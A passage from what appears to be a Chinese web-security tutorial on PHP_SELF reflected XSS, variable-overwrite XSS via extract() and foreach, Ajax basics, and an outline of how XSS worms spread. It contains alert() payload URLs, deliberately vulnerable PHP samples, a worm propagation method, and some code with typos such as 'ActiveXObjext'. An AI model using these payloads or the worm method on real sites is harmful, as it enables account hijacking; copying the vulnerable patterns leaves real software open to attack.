style="--shiki-light:#50A14F;--shiki-dark:#98C379;">[&#39;PHP_SELF&#39;];?&gt;&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">		&lt;</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;">input</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;"> type</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;hidden&quot;</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;"> name</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;submitted&quot;</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;"> value</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;1&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> /&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">		&lt;</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;">input</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;"> type</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;submit&quot;</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;"> value</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;Submit!&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> /&gt;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">&lt;/</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;">form</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">&gt;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>我们把它保存在data.php中，构造，并执行xss弹窗；</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>http://127.0.0.1/data.php/%22%3E%3Cscript%3Ealert(&#39;xss&#39;)%3C/script%3E%3C</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>问题出在&lt;?php echo $_SERVER[&#39;PHP_SELF&#39;]&gt;，该代码直接输出PHP_SELF变量，该变量可由用户控制</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>推荐使用htmlentities($_SERVER[&#39;PHP_SELF&#39;])来替代，我们使用该函数后，上述的代码便不再有效,当然很多$_SERVER变量都有可能存在该问题；</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p><strong>变量覆盖</strong></p><p>当可以变量覆盖的时候，我们可以轻易地执行xss；下面列举几种能引起变量覆盖的情况；</p><p>(1)register_globals=on</p><p>该参数在php4.2.0以上的php版本默认屏蔽，当该变量被打开时，各种变量都可以被重新注册，包括来自html表单的请求变量，由于php变量使用前不需要进行初始化，所以可以直接使用；该参数已在php5.4以上版本进行移除；</p><p>(2)extract</p><p>该函数用于将变量从数组导入到当前符号表中；</p><p>假设具有如下代码，</p><div class="language-php line-numbers-mode" data-highlighter="shiki" data-ext="php" data-title="php" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">&lt;</span><span style="--shiki-light:#383A42;--shiki-dark:#C678DD;">?</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;">php</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">$a</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">1</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">extract</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">$_GET</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">);</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">echo</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;"> $a</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#C678DD;">?</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">&gt;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>由于$a已经被初始化，我们访问extract.php页面，理所当然得到1,注意GET传递的参数，我们试着覆盖变量$a;</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>http://127.0.0.1/extract.php?a=&lt;script&gt;alert(/xss/)&lt;/script&gt;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>就能够正常的执行弹窗；</p><p>(3)遍历初始化变量</p><p>遍历初始化变量同样会造成变量覆盖；使用foreach()函数模拟全局操作；</p><div class="language-php line-numbers-mode" data-highlighter="shiki" data-ext="php" data-title="php" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">&lt;</span><span style="--shiki-light:#383A42;--shiki-dark:#C678DD;">?</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;">php</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> </span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">	$a</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">1</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">	foreach</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">$_GET</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> as</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;"> $key</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> =&gt; </span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">$value</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">){</span></span>
<span class="line"><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">		$$key</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">$value</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">	}</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">	print</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;"> $a</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>传递</p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>a=b&amp;b=&lt;script&gt;alert(/xss/)&lt;/script&gt;</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>很简单我们就能利用这个变量覆盖执行xss;</p><h2 id="_2-9-xss-worm-剖析" tabindex="-1"><a class="header-anchor" href="#_2-9-xss-worm-剖析"><span>2.9 XSS Worm 剖析</span></a></h2><h3 id="_2-9-1-初步了解web-2-0" tabindex="-1"><a class="header-anchor" href="#_2-9-1-初步了解web-2-0"><span>2.9.1 初步了解web 2.0</span></a></h3><p>已知web1.0在于连接用户和网站，网站提供什么，用户就只能读到什么，而web2.0与web1.0最大的区别在于连接用户与用户，增大了用户获取的信息面；</p><p>同时也造成了更多的安全隐患，我们能够利用web2.0进行更广泛的钓鱼，csrf，ajax,flash;</p><h3 id="_2-9-2-ajax技术" tabindex="-1"><a class="header-anchor" href="#_2-9-2-ajax技术"><span>2.9.2 Ajax技术</span></a></h3><p><strong>简析Ajax</strong></p><p>这里研究ajax技术是为了更好的研究xss蠕虫</p><p>传统的Web应用允许用户端填写表单（form），当提交表单时就向<a href="https://zh.wikipedia.org/wiki/%E7%B6%B2%E9%A0%81%E4%BC%BA%E6%9C%8D%E5%99%A8" target="_blank" rel="noopener noreferrer">网页服务器</a>发送一个请求。服务器接收并处理传来的表单，然后送回一个新的网页，但这个做法浪费了许多带宽，因为在前后两个页面中的大部分<a href="https://zh.wikipedia.org/wiki/HTML" target="_blank" rel="noopener noreferrer">HTML</a>码往往是相同的。由于每次应用的沟通都需要向服务器发送请求，应用的回应时间依赖于服务器的回应时间。这导致了用户界面的回应比本机应用慢得多。</p><p>与此不同，AJAX应用可以仅向服务器发送并取回必须的数据，并在客户端采用JavaScript处理来自服务器的回应。因为在服务器和浏览器之间交换的数据大量减少，服务器回应更快了。同时，很多的处理工作可以在发出请求的<a href="https://zh.wikipedia.org/wiki/%E5%AE%A2%E6%88%B7%E7%AB%AF" target="_blank" rel="noopener noreferrer">客户端</a>机器上完成，因此Web服务器的负荷也减少了。</p><p>类似于<a href="https://zh.wikipedia.org/wiki/DHTML" target="_blank" rel="noopener noreferrer">DHTML</a>或<a href="https://zh.wikipedia.org/wiki/LAMP" target="_blank" rel="noopener noreferrer">LAMP</a>，AJAX不是指一种单一的技术，而是有机地利用了一系列相关的技术。虽然其名称包含XML，但实际上数据格式可以由<a href="https://zh.wikipedia.org/wiki/JSON" target="_blank" rel="noopener noreferrer">JSON</a>代替以进一步减少数据量。而客户端与服务器也并不需要异步。一些基于AJAX的“派生／合成”式（derivative/composite）的技术也正在出现，如<a href="https://zh.wikipedia.org/wiki/AFLAX" target="_blank" rel="noopener noreferrer">AFLAX</a>。</p><p>简单来说Ajax就是将简单的处理交给了客户端，并且传递更新内容，页面相应更新内容，并不在需要再发送完整的数据，从而提高用户体验；</p><p><strong>XMLHttpRequest对象</strong></p><p>建立一个XMLHttpRequest对象方法如下：</p><div class="language-javascript line-numbers-mode" data-highlighter="shiki" data-ext="javascript" data-title="javascript" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">try</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">{</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;">	httpRequest</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;"> new</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;"> ActiveXObjext</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;Msxml2.XMLHTTP&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">); </span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">//IE5,IE6使用ActiveXObjext对象</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">}</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">//IE7+、Firefox、Chrome、Safari 以及 Opera均内键xmlhttprequest对象，variable=new XMLHttpRequest();即可</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">catch</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> (</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;">e</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">)</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">{</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">	try</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">{</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;">		httpRequest</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;"> new</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;"> ActiveXObjext</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;Microsoft.XMLHTTP&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">);</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">	}</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">	catch</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> (</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;">e</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">){</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;">		httpRequest</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;"> =</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;"> new</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;"> flase</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">	}</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">}</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>该代码创建了一个ActiveXObject对象，传入的参数是ActiveX对象的progID,此处为Msxml2.XMLHTTP;</p><p>为了通融浏览器版本问题，我们通常使用以下代码；</p><div class="language-javascript line-numbers-mode" data-highlighter="shiki" data-ext="javascript" data-title="javascript" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">var</span><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;"> xmlhttp</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">if</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> (</span><span style="--shiki-light:#383A42;--shiki-dark:#E5C07B;">window</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">XMLHttpRequest</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">)</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">{</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">    //  IE7+, Firefox, Chrome, Opera, Safari 浏览器执行代码</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;">    xmlhttp</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">new</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;"> XMLHttpRequest</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">();</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">}</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">else</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">{</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">    // IE6, IE5 浏览器执行代码</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#E06C75;">    xmlhttp</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">new</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;"> ActiveXObject</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;Microsoft.XMLHTTP&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">);</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">}</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>(1)XMLHttpRequest 对象的方法</p><figure><img src="/articles/assets/xmlhttprequest-Lryy2kXO.png" alt="xmlhttprequest" tabindex="0" loading="lazy"><figcaption>xmlhttprequest</figcaption></figure><p>(2)xmlhttprequest对象的属性</p><figure><img src="/articles/assets/xmlhttprequest2-B8f37jEZ.png" alt="xmlhttprequest2" tabindex="0" loading="lazy"><figcaption>xmlhttprequest2</figcaption></figure><h3 id="_2-9-3-http请求" tabindex="-1"><a class="header-anchor" href="#_2-9-3-http请求"><span>2.9.3 HTTP请求</span></a></h3><p><strong>发送get.post请求</strong></p><div class="language- line-numbers-mode" data-highlighter="shiki" data-ext="" data-title="" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span>//get</span></span>
<span class="line"><span>var xml=new getXmlHttpRequest();//创建请求</span></span>
<span class="line"><span>xml.open(&quot;GET&quot;,&quot;/web/url.php?&quot;+data,true)//初始化请求</span></span>
<span class="line"><span>xml.send();; //建立连接并发送数据</span></span>
<span class="line"><span>//post</span></span>
<span class="line"><span>var xml=new getXmlHttpRequest();//创建请求</span></span>
<span class="line"><span>data=&quot;id=11&amp;username=xxx&amp;password=xxx&quot;;//设置发送数据</span></span>
<span class="line"><span>xml.open(&quot;POST&quot;,&quot;/web/regist.php&quot;,true)//初始化请求</span></span>
<span class="line"><span>xml.setRequestHeader(&quot;Content-Type&quot;,&quot;appliacation/x-www-form-urlencode&quot;);//设置content-type头部，数据以何种形式发送</span></span>
<span class="line"><span>xml.send(data);; //建立连接并发送数据</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="_2-9-4-http响应" tabindex="-1"><a class="header-anchor" href="#_2-9-4-http响应"><span>2.9.4 HTTP响应</span></a></h3><p>如需获得来自服务器的响应，请使用 XMLHttpRequest 对象的 responseText 或 responseXML 属性。</p><p>responseText返回字符串，responseXML返回XML形式的响应数据；</p><p>看一个浅显的例子；</p><div class="language-php line-numbers-mode" data-highlighter="shiki" data-ext="php" data-title="php" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#E5C07B;">var</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;"> xmlhttp</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">if</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> (</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;">window</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;">XMLHttpRequest</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">)</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">{</span></span>
<span class="line"><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;">    xmlhttp</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">new</span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;"> XMLHttpRequest</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">();</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">}</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">else</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">{</span></span>
<span class="line"><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;">    xmlhttp</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">new</span><span style="--shiki-light:#C18401;--shiki-dark:#E5C07B;"> ActiveXObject</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;Microsoft.XMLHTTP&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">);</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">}</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">//创建对象</span></span>
<span class="line"><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;">xmlhttp</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;">onreadystatechange</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">function</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">() </span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">//在文档状态更新时调用</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">	{</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">		if</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> (</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;">xmlhttp</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;">readyState</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">==</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">4</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;"> &amp;&amp;</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;"> xmlhttp</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;">status</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">==</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">200</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">)</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">		{ 	</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">//xml =xmlresponseXML;xml=xmlresponseText;</span></span>
<span class="line"><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;">			xml</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">null</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">		}</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">	}</span></span>
<span class="line"><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;">	xmlhttp</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">open</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;GET&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">,</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;web/url.php?&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">,</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">true</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">);</span></span>
<span class="line"><span style="--shiki-light:#986801;--shiki-dark:#ABB2BF;">	xmlhttp</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">send</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">();</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3 id="_2-9-5-xss-worm介绍" tabindex="-1"><a class="header-anchor" href="#_2-9-5-xss-worm介绍"><span>2.9.5 XSS Worm介绍</span></a></h3><p>XSS worm 实质上是一段脚本程序，通常由javascript或者Vbscript编写而成，在用户浏览xss页面时被激活，站点利用该特性进行传播和感染；类似的还有csrf worm;</p><p><strong>攻击原理简析</strong></p><p>XSS蠕虫通常使用了大量的Ajax技术，由于异步的特性，使得利用ajax的xssworm具有更强的隐蔽性，具有更快的传播速度；</p><p>完整的XSS蠕虫攻击流程如下</p><p>攻击者发现目标网站存在xss漏洞并且可编写xss蠕虫</p><p>利用一个宿主（如博客空间）作为传播源头进行XSS攻击</p><p>当其他用户访问存在XSS蠕虫的博客时，执行以下操作：</p><p>​ 判断用户是否登录i，登录则执行下一步否则执行其他操作</p><p>​ 继续判断用户是否被感染，没有则将其感染；否则跳过；</p><p><strong>攻击行为</strong></p><p>XSS&#39; or</p><p>(1)寻找xss点</p><p>和挖掘xss漏洞一致，我们要在目标的日志，留言等地获得一个alert()弹窗</p><p>(2)实现蠕虫行为</p><p>将XSS shellcode写入后，诱导其他用户点击该网站，用户访问后就会受到劫持，攻击者就可以利用ajax修改用户信息，并将恶意代码添加进去，此过程会不断持续，利用XMLHttpRequest对象，可在后台执行任意操作</p><p>(3)收集蠕虫数据</p><p>我们可以使用抓包工具来得到蠕虫所需要的“唯一值”数据，例如用户的id等</p><p>(4)传播和感染</p><h3 id="_2-9-6-运用dom技术" tabindex="-1"><a class="header-anchor" href="#_2-9-6-运用dom技术"><span>2.9.6 运用dom技术</span></a></h3><p>常见方法为给出一个特定标识符，然后使用document和getElementByld()来访问；</p><div class="language-html line-numbers-mode" data-highlighter="shiki" data-ext="html" data-title="html" 